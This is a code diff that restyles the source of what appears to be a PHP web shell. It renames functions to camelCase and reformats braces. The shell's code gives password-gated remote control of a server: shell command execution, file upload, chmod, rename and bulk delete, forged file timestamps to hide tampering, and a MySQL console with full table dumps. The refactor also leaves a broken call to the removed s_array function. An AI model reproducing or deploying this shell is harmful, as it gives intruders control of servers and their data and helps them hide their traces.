@@ -38,7 +38,7 @@ define('IS_PHPINFO', (!eregi("phpinfo", $dis_func)) ? 1 : 0);
 
 if (IS_GPC) {
 
-    $_POST = s_array($_POST);
+    $_POST = sArray($_POST);
 
 }
 
@@ -130,9 +130,9 @@ if ($pass) {
 
     if ($act == 'login') {
 
-        if ($pass == encode_pass($P['password'])) {
+        if ($pass == encodePass($P['password'])) {
 
-            scookie('loginpass', encode_pass($P['password']));
+            scookie('loginpass', encodePass($P['password']));
 
             @header('Location: ' . SELF);
 
@@ -222,7 +222,8 @@ if ($act == 'phpinfo') {
 
 if (!function_exists('scandir')) {
 
-    function scandir($cwd) {
+    function scandir($cwd)
+    {
 
         $files = array();
 
@@ -602,165 +603,119 @@ if ($act == 'file') {
 
         switch ($p1) {
 
-        case 'createdir':
+            case 'createdir':
 
-            // 创建目录
+                // 创建目录
 
-            if ($p2) {
+                if ($p2) {
 
-                m('Directory created ' . (@mkdir($cwd . $p2, 0777) ? 'success' : 'failed'));
+                    m('Directory created ' . (@mkdir($cwd . $p2, 0777) ? 'success' : 'failed'));
 
-            }
+                }
 
-            break;
+                break;
 
-        case 'uploadFile':
+            case 'uploadFile':
 
-            // 上传文件
+                // 上传文件
 
-            m('File upload ' . (@move_uploaded_file($_FILES['uploadfile']['tmp_name'], $cwd . '/' . $_FILES['uploadfile']['name']) ? 'success' : 'failed'));
+                m('File upload ' . (@move_uploaded_file($_FILES['uploadfile']['tmp_name'], $cwd . '/' . $_FILES['uploadfile']['name']) ? 'success' : 'failed'));
 
-            break;
+                break;
 
-        case 'fileperm':
+            case 'fileperm':
 
-            // 编辑文件属性
+                // 编辑文件属性
 
-            if ($p2 && $p3) {
+                if ($p2 && $p3) {
 
-                $p3 = base_convert($p3, 8, 10);
+                    $p3 = base_convert($p3, 8, 10);
 
-                m('Set file permissions ' . (@chmod($p2, $p3) ? 'success' : 'failed'));
+                    m('Set file permissions ' . (@chmod($p2, $p3) ? 'success' : 'failed'));
 
-            }
+                }
 
-            break;
+                break;
 
-        case 'rename':
+            case 'rename':
 
-            // 改名
+                // 改名
 
-            if ($p2 && $p3) {
+                if ($p2 && $p3) {
 
-                m($p3 . ' renamed ' . $p2 . (@rename($p3, $p2) ? ' success' : ' failed'));
+                    m($p3 . ' renamed ' . $p2 . (@rename($p3, $p2) ? ' success' : ' failed'));
 
-            }
+                }
 
-            break;
+                break;
 
-        case 'clonetime':
+            case 'clonetime':
 
-            // 克隆时间
+                // 克隆时间
 
-            if ($p2 && $p3) {
+                if ($p2 && $p3) {
 
-                $time = @filemtime($p3);
+                    $time = @filemtime($p3);
 
-                m('Set file last modified ' . (@touch($p2, $time, $time) ? 'success' : 'failed'));
+                    m('Set file last modified ' . (@touch($p2, $time, $time) ? 'success' : 'failed'));
 
-            }
+                }
 
-            break;
+                break;
 
-        case 'settime':
+            case 'settime':
 
-            // 自定义时间
+                // 自定义时间
 
-            if ($p2 && $p3) {
+                if ($p2 && $p3) {
 
-                $time = strtotime($p3);
+                    $time = strtotime($p3);
 
-                m('Set file last modified ' . (@touch($p2, $time, $time) ? 'success' : 'failed'));
+                    m('Set file last modified ' . (@touch($p2, $time, $time) ? 'success' : 'failed'));
 
-            }
+                }
 
-            break;
+                break;
 
-        case 'delete':
+            case 'delete':
 
-            // 批量删除文件
+                // 批量删除文件
 
-            if ($P['dl']) {
+                if ($P['dl']) {
 
-                $succ = $fail = 0;
+                    $succ = $fail = 0;
 
-                foreach ($P['dl'] as $f) {
+                    foreach ($P['dl'] as $f) {
 
-                    if (is_dir($cwd . $f)) {
+                        if (is_dir($cwd . $f)) {
 
-                        if (@deltree($cwd . $f)) {
+                            if (@deltree($cwd . $f)) {
 
-                            $succ++;
+                                $succ++;
 
-                        } else {
+                            } else {
 
-                            $fail++;
+                                $fail++;
 
-                        }
-
-                    } else {
-
-                        if (@unlink($cwd . $f)) {
-
-                            $succ++;
+                            }
 
                         } else {
 
-                            $fail++;
+                            if (@unlink($cwd . $f)) {
+
+                                $succ++;
+
+                            } else {
+
+                                $fail++;
+
+                            }
 
                         }
 
                     }
 
-                }
-
-                m('Deleted folder/file(s) have finished, choose ' . count($P['dl']) . ', success ' . $succ . ', fail ' . $fail);
-
-            } else {
-
-                m('Please select folder/file(s)');
-
-            }
-
-            break;
-
-        case 'paste':
-
-            if ($_SESSION['do'] == 'copy') {
-
-                foreach ($_SESSION['dl'] as $f) {
-
-                    copy_paste($_SESSION['c'], $f, $cwd);
-
-                }
-
-            } elseif ($_SESSION['do'] == 'move') {
-
-                foreach ($_SESSION['dl'] as $f) {
-
-                    @rename($_SESSION['c'] . $f, $cwd . $f);
-
-                }
-
-            }
-
-            unset($_SESSION['do'], $_SESSION['dl'], $_SESSION['c']);
-
-            break;
-
-        default:
-
-            if ($p1 == 'copy' || $p1 == 'move') {
-
-                if (isset($P['dl']) && count($P['dl'])) {
-
-                    $_SESSION['do'] = $p1;
-
-                    $_SESSION['dl'] = $P['dl'];
-
-                    $_SESSION['c'] = $P['cwd'];
-
-                    m('Have been copied to the session');
+                    m('Deleted folder/file(s) have finished, choose ' . count($P['dl']) . ', success ' . $succ . ', fail ' . $fail);
 
                 } else {
 
@@ -768,9 +723,55 @@ if ($act == 'file') {
 
                 }
 
-            }
+                break;
 
-            break;
+            case 'paste':
+
+                if ($_SESSION['do'] == 'copy') {
+
+                    foreach ($_SESSION['dl'] as $f) {
+
+                        copyPaste($_SESSION['c'], $f, $cwd);
+
+                    }
+
+                } elseif ($_SESSION['do'] == 'move') {
+
+                    foreach ($_SESSION['dl'] as $f) {
+
+                        @rename($_SESSION['c'] . $f, $cwd . $f);
+
+                    }
+
+                }
+
+                unset($_SESSION['do'], $_SESSION['dl'], $_SESSION['c']);
+
+                break;
+
+            default:
+
+                if ($p1 == 'copy' || $p1 == 'move') {
+
+                    if (isset($P['dl']) && count($P['dl'])) {
+
+                        $_SESSION['do'] = $p1;
+
+                        $_SESSION['dl'] = $P['dl'];
+
+                        $_SESSION['c'] = $P['cwd'];
+
+                        m('Have been copied to the session');
+
+                    } else {
+
+                        m('Please select folder/file(s)');
+
+                    }
+
+                }
+
+                break;
 
         }
 
@@ -1350,71 +1351,71 @@ elseif ($act == 'mysqladmin') {
 
                         p("<p class=\"red b\">Query#{$num} : " . htmlspecialchars($query, ENT_QUOTES) . "</p>");
 
-                        switch ($DB->query_res($query)) {
+                        switch ($DB->queryRes($query)) {
 
-                        case 0:
+                            case 0:
 
-                            p('<h2>' . $DB->halt('Error') . '</h2>');
+                                p('<h2>' . $DB->halt('Error') . '</h2>');
 
-                            break;
+                                break;
 
-                        case 1:
+                            case 1:
 
-                            $result = $DB->query($query);
+                                $result = $DB->query($query);
 
-                            $tatol = $DB->num_rows($result);
+                                $tatol = $DB->numRows($result);
 
-                            p('<table border="0" cellpadding="3" cellspacing="0">');
+                                p('<table border="0" cellpadding="3" cellspacing="0">');
 
-                            p('<tr class="head">');
+                                p('<tr class="head">');
 
-                            $fieldnum = @mysql_num_fields($result);
+                                $fieldnum = @mysql_num_fields($result);
 
-                            for ($i = 0; $i < $fieldnum; $i++) {
+                                for ($i = 0; $i < $fieldnum; $i++) {
 
-                                p('<td nowrap>' . @mysql_field_name($result, $i) . '</td>');
-
-                            }
-
-                            p('</tr>');
-
-                            if (!$tatol) {
-
-                                p('<tr class="alt2" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'alt2\';"><td nowrap colspan="' . $fieldnum . '" class="red b">No records</td></tr>');
-
-                            } else {
-
-                                while ($mn = $DB->fetch($result)) {
-
-                                    $thisbg = bg();
-
-                                    p('<tr class="' . $thisbg . '" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'' . $thisbg . '\';">');
-
-                                    //读取记录用
-
-                                    foreach ($mn as $key => $inside) {
-
-                                        p('<td nowrap>' . (($inside == null) ? '<i>null</i>' : html_clean($inside)) . '</td>');
-
-                                    }
-
-                                    p('</tr>');
-
-                                    unset($b1);
+                                    p('<td nowrap>' . @mysql_field_name($result, $i) . '</td>');
 
                                 }
 
-                            }
+                                p('</tr>');
 
-                            p('</table>');
+                                if (!$tatol) {
 
-                            break;
+                                    p('<tr class="alt2" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'alt2\';"><td nowrap colspan="' . $fieldnum . '" class="red b">No records</td></tr>');
 
-                        case 2:
+                                } else {
 
-                            p('<h2>Affected Rows : ' . $DB->affected_rows() . '</h2>');
+                                    while ($mn = $DB->fetch($result)) {
 
-                            break;
+                                        $thisbg = bg();
+
+                                        p('<tr class="' . $thisbg . '" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'' . $thisbg . '\';">');
+
+                                        //读取记录用
+
+                                        foreach ($mn as $key => $inside) {
+
+                                            p('<td nowrap>' . (($inside == null) ? '<i>null</i>' : htmlClean($inside)) . '</td>');
+
+                                        }
+
+                                        p('</tr>');
+
+                                        unset($b1);
+
+                                    }
+
+                                }
+
+                                p('</table>');
+
+                                break;
+
+                            case 2:
+
+                                p('<h2>Affected Rows : ' . $DB->affectedRows() . '</h2>');
+
+                                break;
 
                         }
 
@@ -1566,7 +1567,7 @@ elseif ($act == 'mysqladmin') {
 
                 }
 
-                $DB->free_result($query);
+                $DB->freeResult($query);
 
             }
 
@@ -2058,7 +2059,8 @@ if (isset($DB)) {
 
 ======================================================*/
 
-function secparam($n, $v) {
+function secparam($n, $v)
+{
 
     $v = trim($v);
 
@@ -2080,7 +2082,8 @@ function secparam($n, $v) {
 
 }
 
-function m($msg) {
+function m($msg)
+{
 
     echo '<div style="margin:10px auto 15px auto;background:#ffffe0;border:1px solid #e6db55;padding:10px;font:14px;text-align:center;font-weight:bold;">';
 
@@ -2090,13 +2093,15 @@ function m($msg) {
 
 }
 
-function s_array($array) {
+function sArray($array)
+{
 
     return is_array($array) ? array_map('s_array', $array) : stripslashes($array);
 
 }
 
-function scookie($key, $value, $life = 0, $prefix = 1) {
+function scookie($key, $value, $life = 0, $prefix = 1)
+{
 
     global $timestamp, $_SERVER, $cookiepre, $cookiedomain, $cookiepath, $cookielife;
 
@@ -2110,7 +2115,8 @@ function scookie($key, $value, $life = 0, $prefix = 1) {
 
 }
 
-function loginpage() {
+function loginpage()
+{
 
     formhead();
 
@@ -2126,7 +2132,8 @@ function loginpage() {
 
 }
 
-function execute($cfe) {
+function execute($cfe)
+{
 
     $res = '';
 
@@ -2182,7 +2189,8 @@ function execute($cfe) {
 
 }
 
-function which($pr) {
+function which($pr)
+{
 
     $path = execute("which $pr");
 
@@ -2190,7 +2198,8 @@ function which($pr) {
 
 }
 
-function cf($fname, $text) {
+function cf($fname, $text)
+{
 
     if ($fp = @fopen($fname, 'w')) {
 
@@ -2202,7 +2211,8 @@ function cf($fname, $text) {
 
 }
 
-function dirsize($cwd) {
+function dirsize($cwd)
+{
 
     $dh = @opendir($cwd);
 
@@ -2228,7 +2238,8 @@ function dirsize($cwd) {
 
 // 页面调试信息
 
-function debuginfo() {
+function debuginfo()
+{
 
     global $starttime;
 
@@ -2242,7 +2253,8 @@ function debuginfo() {
 
 // 清除HTML代码
 
-function html_clean($content) {
+function htmlClean($content)
+{
 
     $content = htmlspecialchars($content);
 
@@ -2258,13 +2270,15 @@ function html_clean($content) {
 
 // 获取权限
 
-function getChmod($file) {
+function getChmod($file)
+{
 
     return substr(base_convert(@fileperms($file), 10, 8), -4);
 
 }
 
-function PermsColor($f) {
+function PermsColor($f)
+{
 
     if (!is_readable($f)) {
 
@@ -2282,7 +2296,8 @@ function PermsColor($f) {
 
 }
 
-function getPerms($file) {
+function getPerms($file)
+{
 
     $mode = @fileperms($file);
 
@@ -2316,7 +2331,8 @@ function getPerms($file) {
 
 }
 
-function getUser($file) {
+function getUser($file)
+{
 
     if (function_exists('posix_getpwuid')) {
 
@@ -2334,7 +2350,8 @@ function getUser($file) {
 
 }
 
-function copy_paste($c, $f, $d) {
+function copyPaste($c, $f, $d)
+{
 
     if (is_dir($c . $f)) {
 
@@ -2348,7 +2365,7 @@ function copy_paste($c, $f, $d) {
 
             foreach ($dirs as $file) {
 
-                copy_paste($c . $f . '/', $file, $d . $f . '/');
+                copyPaste($c . $f . '/', $file, $d . $f . '/');
 
             }
 
@@ -2364,7 +2381,8 @@ function copy_paste($c, $f, $d) {
 
 // 删除目录
 
-function deltree($deldir) {
+function deltree($deldir)
+{
 
     $dirs = @scandir($deldir);
 
@@ -2404,7 +2422,8 @@ function deltree($deldir) {
 
 // 表格行间的背景色替换
 
-function bg() {
+function bg()
+{
 
     global $bgc;
 
@@ -2412,7 +2431,8 @@ function bg() {
 
 }
 
-function cmp($a, $b) {
+function cmp($a, $b)
+{
 
     global $sort;
 
@@ -2430,7 +2450,8 @@ function cmp($a, $b) {
 
 // 获取当前目录的上级目录
 
-function getUpPath($cwd) {
+function getUpPath($cwd)
+{
 
     $pathdb = explode('/', $cwd);
 
@@ -2452,7 +2473,8 @@ function getUpPath($cwd) {
 
 // 检查PHP配置参数
 
-function getcfg($varname) {
+function getcfg($varname)
+{
 
     $result = get_cfg_var($varname);
 
@@ -2474,7 +2496,8 @@ function getcfg($varname) {
 
 // 获得文件扩展名
 
-function getext($file) {
+function getext($file)
+{
 
     $info = pathinfo($file);
 
@@ -2482,7 +2505,8 @@ function getext($file) {
 
 }
 
-function GetWDirList($path) {
+function GetWDirList($path)
+{
 
     global $dirdata, $j, $web_cwd;
 
@@ -2534,7 +2558,8 @@ function GetWDirList($path) {
 
 }
 
-function sizecount($size) {
+function sizecount($size)
+{
 
     $unit = array('Bytes', 'KB', 'MB', 'GB', 'TB', 'PB');
 
@@ -2548,19 +2573,22 @@ function sizecount($size) {
 
 }
 
-function p($str) {
+function p($str)
+{
 
     echo $str . "\n";
 
 }
 
-function makehide($name, $value = '') {
+function makehide($name, $value = '')
+{
 
     p("<input id=\"$name\" type=\"hidden\" name=\"$name\" value=\"$value\" />");
 
 }
 
-function makeinput($arg = array()) {
+function makeinput($arg = array())
+{
 
     $arg['size'] = isset($arg['size']) && $arg['size'] > 0 ? "size=\"$arg[size]\"" : "size=\"100\"";
 
@@ -2586,7 +2614,8 @@ function makeinput($arg = array()) {
 
 }
 
-function makeselect($arg = array()) {
+function makeselect($arg = array())
+{
 
     $onchange = isset($arg['onchange']) ? 'onchange="' . $arg['onchange'] . '"' : '';
 
@@ -2618,7 +2647,8 @@ function makeselect($arg = array()) {
 
 }
 
-function formhead($arg = array()) {
+function formhead($arg = array())
+{
 
     !isset($arg['method']) && $arg['method'] = 'post';
 
@@ -2638,7 +2668,8 @@ function formhead($arg = array()) {
 
 }
 
-function maketext($arg = array()) {
+function maketext($arg = array())
+{
 
     $arg['title'] = isset($arg['title']) ? $arg['title'] . '<br />' : '';
 
@@ -2648,7 +2679,8 @@ function maketext($arg = array()) {
 
 }
 
-function formfooter($name = '') {
+function formfooter($name = '')
+{
 
     !$name && $name = 'submit';
 
@@ -2658,7 +2690,8 @@ function formfooter($name = '') {
 
 }
 
-function goback() {
+function goback()
+{
 
     global $cwd, $charset;
 
@@ -2666,13 +2699,15 @@ function goback() {
 
 }
 
-function formfoot() {
+function formfoot()
+{
 
     p('</form>');
 
 }
 
-function encode_pass($pass) {
+function encodePass($pass)
+{
 
     $pass = md5($pass);
 
@@ -2680,23 +2715,26 @@ function encode_pass($pass) {
 
 }
 
-function pr($a) {
+function pr($a)
+{
 
     p('<div style="text-align: left;border:1px solid #ddd;"><pre>' . print_r($a) . '</pre></div>');
 
 }
 
-class DB_MySQL {
+class DbMysql
+{
 
-    var $querycount = 0;
+    public $querycount = 0;
 
-    var $link;
+    public $link;
 
-    var $charsetdb = array();
+    public $charsetdb = array();
 
-    var $charset = '';
+    public $charset = '';
 
-    function connect($dbhost, $dbuser, $dbpass, $dbname = '') {
+    public function connect($dbhost, $dbuser, $dbpass, $dbname = '')
+    {
 
         @ini_set('mysql.connect_timeout', 5);
 
@@ -2716,7 +2754,8 @@ class DB_MySQL {
 
     }
 
-    function setcharset($charset) {
+    public function setcharset($charset)
+    {
 
         if ($charset && $this->charsetdb[$charset]) {
 
@@ -2734,32 +2773,37 @@ class DB_MySQL {
 
     }
 
-    function select_db($dbname) {
+    public function selectDb($dbname)
+    {
 
         return mysql_select_db($dbname, $this->link);
 
     }
 
-    function geterrdesc() {
+    public function geterrdesc()
+    {
 
         return (($this->link) ? mysql_error($this->link) : mysql_error());
 
     }
 
-    function geterrno() {
+    public function geterrno()
+    {
 
         return intval(($this->link) ? mysql_errno($this->link) : mysql_errno());
 
     }
 
-    function fetch($query, $result_type = MYSQL_ASSOC) {
+    public function fetch($query, $result_type = MYSQL_ASSOC)
+    {
         //MYSQL_NUM
 
         return mysql_fetch_array($query, $result_type);
 
     }
 
-    function query($sql) {
+    public function query($sql)
+    {
 
         //echo '<p style="color:#f00;">'.$sql.'</p>';
 
@@ -2775,7 +2819,8 @@ class DB_MySQL {
 
     }
 
-    function query_res($sql) {
+    public function queryRes($sql)
+    {
 
         $res = '';
 
@@ -2799,7 +2844,8 @@ class DB_MySQL {
 
     }
 
-    function num_rows($query) {
+    public function numRows($query)
+    {
 
         $query = mysql_num_rows($query);
 
@@ -2807,7 +2853,8 @@ class DB_MySQL {
 
     }
 
-    function num_fields($query) {
+    public function numFields($query)
+    {
 
         $query = mysql_num_fields($query);
 
@@ -2815,13 +2862,15 @@ class DB_MySQL {
 
     }
 
-    function affected_rows() {
+    public function affectedRows()
+    {
 
         return mysql_affected_rows($this->link);
 
     }
 
-    function result($query, $row) {
+    public function result($query, $row)
+    {
 
         $query = mysql_result($query, $row);
 
@@ -2829,7 +2878,8 @@ class DB_MySQL {
 
     }
 
-    function free_result($query) {
+    public function freeResult($query)
+    {
 
         $query = mysql_free_result($query);
 
@@ -2837,19 +2887,22 @@ class DB_MySQL {
 
     }
 
-    function version() {
+    public function version()
+    {
 
         return mysql_get_server_info($this->link);
 
     }
 
-    function close() {
+    public function close()
+    {
 
         return mysql_close($this->link);
 
     }
 
-    function halt($msg = '') {
+    public function halt($msg = '')
+    {
 
         echo "<h2>" . htmlspecialchars($msg) . "</h2>\n";
 
@@ -2861,11 +2914,12 @@ class DB_MySQL {
 
     }
 
-    function get_fields_meta($result) {
+    public function getFieldsMeta($result)
+    {
 
         $fields = array();
 
-        $num_fields = $this->num_fields($result);
+        $num_fields = $this->numFields($result);
 
         for ($i = 0; $i < $num_fields; $i++) {
 
@@ -2879,7 +2933,8 @@ class DB_MySQL {
 
     }
 
-    function sqlAddSlashes($s = '') {
+    public function sqlAddSlashes($s = '')
+    {
 
         $s = str_replace('\\', '\\\\', $s);
 
@@ -2891,7 +2946,8 @@ class DB_MySQL {
 
     // 备份数据库
 
-    function sqldump($table, $fp = 0) {
+    public function sqldump($table, $fp = 0)
+    {
 
         $crlf = (IS_WIN ? "\r\n" : "\n");
 
@@ -2957,9 +3013,9 @@ class DB_MySQL {
 
         $rows = $this->query("SELECT * FROM $table");
 
-        $fields_cnt = $this->num_fields($rows);
+        $fields_cnt = $this->numFields($rows);
 
-        $fields_meta = $this->get_fields_meta($rows);
+        $fields_meta = $this->getFieldsMeta($rows);
 
         while ($row = $this->fetch($rows, MYSQL_NUM)) {
 
@@ -3009,7 +3065,7 @@ class DB_MySQL {
 
         }
 
-        $this->free_result($rows);
+        $this->freeResult($rows);
 
     }
 
